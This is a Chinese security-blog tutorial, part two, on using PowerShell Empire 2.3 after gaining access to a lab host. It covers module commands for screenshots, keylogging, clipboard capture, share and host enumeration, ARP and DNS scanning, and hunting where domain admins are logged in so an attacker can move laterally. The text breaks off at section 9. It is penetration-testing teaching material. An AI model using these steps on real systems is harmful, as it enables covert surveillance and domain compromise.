<html>
<head>
<title>一篇文章精通PowerShellEmpire2.3（下）</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
一篇文章精通PowerShell Empire 2.3（下）
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    HACK学习
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2018-09-29</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p data-mpa-powered-by="yiban.io"><img class="" data-copyright="0" data-ratio="0.3188202247191011" data-s="300,640" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/1_aPbK6xQJIHiaUOB16u0KcQnicDG9pg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNacP7iaHc5fOEUUHZIlTV3uyqOmgKiaPbK6xQJIHiaUOB16u0KcQnicDG9pg/640?wx_fmt=png'" data-type="png" data-w="712" style=""  /></p><p><img class="" data-ratio="0.528125" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/2_qoFkIQG0H2jGJstVXqGLrnmasmCibQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRgMcAdR9sic8eRrLDiaxprIpCPswqoFkIQG0H2jGJstVXqGLrnmasmCibQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="640"  /></p><h2 name="h2-1"><strong><span style="font-size:14px;line-height:34px;;">0×05.&nbsp;信息收集</span></strong></a></h2><p><strong><span style="font-size:14px;line-height:34px;;"><br  /></span></strong></p><p><span style="font-size:14px;line-height:34px;;">Empire主要用于后渗透。所以信息收集是比较常用的一个模块，我们可以使用searchmodule命令搜索需要使用的模块，这里通过键入“usemodule collection”然后按Tab键来查看完整列表，如下图所示。</span></p><p><img class="" data-ratio="0.38649155722326456" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/3_7BRwpHdnjVLdFGBcuJxhlia6mcvNVQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRbbDbgJqtvZqVDqpJAljeckzna7BRwpHdnjVLdFGBcuJxhlia6mcvNVQ/640?wx_fmt=png'" data-type="png" data-w="533" style="vertical-align: middle;border-style: none;display: block;margin: 12px 12.7px;top: 0px;left: 0px;right: 0px;bottom: 0px;" title="t01ceacec42329ec6f7.png"  /></p><p><span style="font-size:14px;line-height:34px;;">这里我们演示几个常用模块:</span></p><p><span style="font-size:14px;line-height:34px;;">1.屏幕截图</span></p><p><span style="font-size:14px;line-height:34px;;">输入usemodule collection/screenshot，info命令可以查看具体参数，如下图所示。</span></p><p><img class="" data-backh="203" data-backw="490" data-before-oversubscription-url="https://p2.ssl.qhimg.com/t0167d10ed77f184cda.png" data-ratio="0.4142857142857143" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/4_SSB8w2ibIVURpF0dsX6GgYDa5rkutA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRibyz6cNRQibGMUniahiak8I6ibvc39SSB8w2ibIVURpF0dsX6GgYDa5rkutA/640?wx_fmt=png'" data-type="png" data-w="490" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">不需要做多余设置，直接execute可以看到目标主机屏幕截图。</span></p><p><img class="" data-ratio="0.11676646706586827" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/5_ho54aKdMsljINeOjISficAe8ibFyrg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRZsKsKlGLB4n77C5oLWXaLEj8hQho54aKdMsljINeOjISficAe8ibFyrg/640?wx_fmt=png'" data-type="png" data-w="668"  /></p><p><img class="" data-backh="336" data-backw="558" data-before-oversubscription-url="https://p2.ssl.qhimg.com/t01e953bd190d3b671e.png" data-ratio="0.6017830609212481" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/6_eSCgm3TdYtEztL4XlUTkQnsicD2TcQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRZKOg0qZIes6TibEKgWHPuQeKTReSCgm3TdYtEztL4XlUTkQnsicD2TcQ/640?wx_fmt=png'" data-type="png" data-w="673" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">2.键盘记录</span></p><p><span style="font-size:14px;line-height:34px;;">输入usemodule collection/keylogger，info命令可以查看具体参数，如下图所示。</span></p><p><img class="" data-backh="221" data-backw="467" data-before-oversubscription-url="http://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRsCcO6YFxGEL7y7d9bdMgmXp6zjZIgrwxeP5A204UjPH8A30t1t8PgA/0?wx_fmt=png" data-oversubscription-url="http://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRAyPUT1K6me4ADTxdUVUMsialnIwT3MCtKHct7tX0AT2K9vhnniamN9DQ/0?wx_fmt=jpeg" data-ratio="0.4732334047109208" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/7_wT3MCtKHct7tX0AT2K9vhnniamN9DQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRAyPUT1K6me4ADTxdUVUMsialnIwT3MCtKHct7tX0AT2K9vhnniamN9DQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="467" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">设置保持默认就可以，我们输入execute启动，就开启记录键盘输入了，会自动在empire/downloads/&lt;AgentName&gt;下生成一个agent.log，如下图所示。</span></p><p><img class="" data-backh="156" data-backw="461" data-before-oversubscription-url="https://p0.ssl.qhimg.com/t0163e61e5bc65d753b.png" data-ratio="0.3383947939262473" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/8_CKRAccad3sErqyFY85HqrShg5U3Z9A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRfwnId6t4z7iaPHYvX4oHOHVbpCKRAccad3sErqyFY85HqrShg5U3Z9A/640?wx_fmt=png'" data-type="png" data-w="461" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">这里我们在虚拟机打开一个记事本随便输入一些文字。如下图所示。</span></p><p><img class="" data-backh="91" data-backw="338" data-before-oversubscription-url="https://p4.ssl.qhimg.com/t01133d9129d1fd1225.png" data-ratio="0.2692307692307692" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/9_7RYAokU95XO282FNpQOiaT5ic3qVYQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRicAjUkY47uAUrlAumWcvTjyVzbJ7RYAokU95XO282FNpQOiaT5ic3qVYQ/640?wx_fmt=png'" data-type="png" data-w="338" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">我们打开agent.log可以看到在我们的监控端已经全部记录下来了，虽然不能记录中文，但是大概意思我们还是能看出来的，标点符号也记录了下来，相对来说还是记录英文比较好，如下图所示。</span></p><p><img class="" data-backh="321" data-backw="311" data-before-oversubscription-url="https://p4.ssl.qhimg.com/t01b0d564bac65e6171.png" data-ratio="1.0321543408360128" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/10_Vsh2KUz5boCKmn77wMARBxFJibgsNw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRfW2gWHFsYHPviaqQwicEMh72wFfVsh2KUz5boCKmn77wMARBxFJibgsNw/640?wx_fmt=png'" data-type="png" data-w="311" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">如果我们要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs会显示当前在后台的记录，如果要终止一个记录，可以使用jobs kill JOB_name，这里可以输入jobs kill N7XE38即可停止键盘记录，如下图所示。</span></p><p><img class="" data-backh="240" data-backw="290" data-before-oversubscription-url="https://p0.ssl.qhimg.com/t019a5ceb2a45db3ff4.png" data-ratio="0.8275862068965517" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/11_qEVKawvKCTnwgmibHAWpjdfFfmr1eg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRYRiarxygkgfDAxXsQZw6xibiaMB6qEVKawvKCTnwgmibHAWpjdfFfmr1eg/640?wx_fmt=png'" data-type="png" data-w="290" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">3.剪贴板记录</span></p><p><span style="font-size:14px;line-height:34px;;">这个模块允许你抓取存储在目标主机Windows剪贴板上的任何内容。模块参数可以设置抓取限制和间隔时间，一般情况下，保持默认设置就可以，这里我们输入usemodule collection/clipboard_monitor，同样info命令可以查看具体参数，如下图所示。</span></p><p><img class="" data-backh="210" data-backw="540" data-before-oversubscription-url="https://p5.ssl.qhimg.com/t013a06db7fb8a50839.png" data-ratio="0.3888888888888889" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/12_uAYAvXQr3jzcP2RicdQRdWmQSqur9Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRJTt9C2XV4sx9WYlXKm687K0ImuAYAvXQr3jzcP2RicdQRdWmQSqur9Q/640?wx_fmt=png'" data-type="png" data-w="540" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">我们在目标主机随便COPY一句话，可以看到屏幕已经有结果了，速度还是很快的，如下图所示。</span></p><p><img class="" data-backh="298" data-backw="558" data-before-oversubscription-url="https://p3.ssl.qhimg.com/t0100bf5e28ce929552.png" data-ratio="0.533106960950764" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/13_VyszibSia67wWOEkpzMKTpib1qMGpg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRu9FPW8UvwVUqo4px7dv0Ixnug8EVyszibSia67wWOEkpzMKTpib1qMGpg/640?wx_fmt=png'" data-type="png" data-w="589" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">同样当前监控模块也可以置于后台，输入jobs会显示当前在后台的记录，如果要终止话同样输入jobs kill JOB_name，如下图所示。</span></p><p><img class="" data-backh="233" data-backw="289" data-before-oversubscription-url="https://p3.ssl.qhimg.com/t0114a6bcb3ae15a653.png" data-ratio="0.8062283737024222" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/14_cT1YLDm9O9AY8uuPxj539pbn8Vh8bA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRaDqEVaXLNS7TP9vcjqic66YOgcT1YLDm9O9AY8uuPxj539pbn8Vh8bA/640?wx_fmt=png'" data-type="png" data-w="289" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">4.查找共享</span></p><p><span style="font-size:14px;line-height:34px;;">输入usemodule situational_awareness/network/powerview/share_finder 命令将会列出域内所有的共享，可以设置CheckShareAccess选项将只返回可从当前用户上下文中读取的共享，这里保持默认，如下图所示。</span></p><p><img class="" data-backh="246" data-backw="558" data-before-oversubscription-url="https://p3.ssl.qhimg.com/t0119a82ad4afe88f95.png" data-ratio="0.43915343915343913" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/15_8hGpcc46nxcbk3x4P5ClsJTdJqeWPw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRz0xHXtP6xibWIvytEYFX5ucJS8hGpcc46nxcbk3x4P5ClsJTdJqeWPw/640?wx_fmt=png'" data-type="png" data-w="756" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">5.收集目标主机有用的信息</span></p><p><span style="font-size:14px;line-height:34px;;">输入命令usemodule situational_awareness/host/winenum，可以查看本机用户，域组成员，最后密码设置时间，剪贴板内容，系统基本系统信息，网络适配器信息，共享信息等等，如下图所示。</span></p><p><img class="" data-backh="328" data-backw="558" data-before-oversubscription-url="https://p3.ssl.qhimg.com/t01d5537a4cde4fcf2f.png" data-ratio="0.5868465430016864" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/16_7E07wwyPYL9IKPSglticMtPF1uvGbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRfuw5aQ40FTJs4AbBbg14nulL27E07wwyPYL9IKPSglticMtPF1uvGbQ/640?wx_fmt=png'" data-type="png" data-w="593" style="width: 100%;height: auto;"  /></p><p><img class="" data-backh="226" data-backw="353" data-before-oversubscription-url="https://p4.ssl.qhimg.com/t0148c72f3ecd6244ca.png" data-ratio="0.6402266288951841" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/17_HibXXnClTrkoRq5ZFjFdYz77WJcMkw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR1NNHS6wjkqcbcDHmD3ic6CP8g2HibXXnClTrkoRq5ZFjFdYz77WJcMkw/640?wx_fmt=png'" data-type="png" data-w="353" style="width: 100%;height: auto;"  /></p><p><br  /></p><p><span style="font-size:14px;line-height:34px;;">另外还有situational_awareness/host/computerdetails模块，列举了系统中的基本所有有用信息。显示目标主机事件日志，应用程序控制策略日志，包括RDP登陆信息，Powershell 脚本运行和保存的信息等等。运行这个模块的时候需要管理权限，大家可以试一下。</span></p><p><span style="font-size:14px;line-height:34px;;">6.ARP扫描</span></p><p><span style="font-size:14px;line-height:34px;;">Empire也内置arp扫描模块，输入usemodule situational_awareness/network/arpscan</span></p><p><span style="font-size:14px;line-height:34px;;">命令使用该模块，输入info命令查看具体参数，如下图所示。</span></p><p><img class="" data-backh="374" data-backw="558" data-before-oversubscription-url="https://p0.ssl.qhimg.com/t018729cddf0b2174f8.png" data-ratio="0.6695526695526696" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/18_zIXgy0iaLTxuDbS7CyEh3ibvZKcpaw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpReWL8kL00icnMqOibDkzRUOTnqgBJzIXgy0iaLTxuDbS7CyEh3ibvZKcpaw/640?wx_fmt=png'" data-type="png" data-w="693" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">这里要设置一下Range参数，输入下列命令设置为要扫描的网段，如下图所示。</span></p><pre><span style="font-size:14px;line-height:34px;;">set&nbsp;Range&nbsp;192.168.31.0-192.168.31.254<br  />execute</span></pre><p><img class="" data-backh="222" data-backw="558" data-before-oversubscription-url="https://p5.ssl.qhimg.com/t0114b8ca8ded7b08db.png" data-ratio="0.39622641509433965" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/19_zc8eE1snFb0luibLRVPKUsF5GSwiag.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRXw6juS3AoVicMIweMHic4gLCCk7Lzc8eE1snFb0luibLRVPKUsF5GSwiag/640?wx_fmt=png'" data-type="png" data-w="795" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">同样Empire也内置了端口扫描模块，&nbsp;situational_awareness/network/portscan这里就不演示了。</span></p><p><span style="font-size:14px;line-height:34px;;">7.DNS信息获取</span></p><p><span style="font-size:14px;line-height:34px;;">在内网中，知道所有机器的HostName和对应的IP地址对分析内网结构至关重要，输入usemodule situational_awareness/network/reverse_dns命令使用该模块，输入info命令查看具体参数，如下图所示。</span></p><p><img class="" data-ratio="0.8021778584392014" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/20_1u0kMWRmWroghHiaFeEZ8pcyzV4tVQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRBKNFF5riaNurDA6Dj6USOWCZCF1u0kMWRmWroghHiaFeEZ8pcyzV4tVQ/640?wx_fmt=png'" data-type="png" data-w="551"  /></p><p><span style="font-size:14px;line-height:34px;;">这里要设置一下Range参数，输入你要扫描的IP网段运行，如下图所示。</span></p><p><img class="" data-ratio="0.48936170212765956" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/21_NpKaicXoicsfvXC6ibhyJCaeSZkPCw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRPAQDvIvibWGSvUicfBHHSBViagXkuJNpKaicXoicsfvXC6ibhyJCaeSZkPCw/640?wx_fmt=png'" data-type="png" data-w="517"  /></p><p><span style="font-size:14px;line-height:34px;;">如果该主机同时有2个网卡，Empire也会显示出来，方便我们寻找边界主机。</span></p><p><span style="font-size:14px;line-height:34px;;">另一个模块模块situational_awareness/host/dnsserver，可以显示出当前内网DNS服务器IP地址，如下图所示。</span></p><p><img class="" data-ratio="0.21287128712871287" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/22_picMMS2IvR9VibYibQLcEJyCqw80Qg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRia1nic7bweKt2ReEpQPOCVu2rbtInpicMMS2IvR9VibYibQLcEJyCqw80Qg/640?wx_fmt=png'" data-type="png" data-w="606"  /></p><p><span style="font-size:14px;line-height:34px;;">8.查找域管登陆服务器IP</span></p><p><span style="font-size:14px;line-height:34px;;">在内网渗透中，拿到内网中某一台机器，想要获得域管权限，有一种方法是找到域管登陆的机器，然后横向渗透进去，窃取域管权限，从而拿下整个域，这个模块就是用来查找域管登陆的机器。</span></p><p><span style="font-size:14px;line-height:34px;;">使用模块usemodule situational_awareness/network/powerview/user_hunter，输入info查看设置参数，如下图所示。</span></p><p><img class="" data-ratio="0.7339003645200486" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/23_wAu47sd61REic59ZgPw32ceXOjjwOw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRhM4pfbTLmbWCibibWfKn4bkKgTdwAu47sd61REic59ZgPw32ceXOjjwOw/640?wx_fmt=png'" data-type="png" data-w="823"  /></p><p><span style="font-size:14px;line-height:34px;;">这个模块可以清楚看到哪个用户登录了哪台主机，结果显示域管曾经登录过机器名为WIN7-64.shuteer.testlab,IP地址为192.168.31.251的这台机器上。如下图所示。</span></p><p><img class="" data-ratio="0.5161787365177196" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/24_hjRvVkmLaRxY3wSa1BH9whibMxlcow.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRUYnyYrQ0WSXwwtDrZ1tZVoICvhjRvVkmLaRxY3wSa1BH9whibMxlcow/640?wx_fmt=png'" data-type="png" data-w="649"  /></p><p><span style="font-size:14px;line-height:34px;;">9.本地管理组访问模块</span></p><p><span 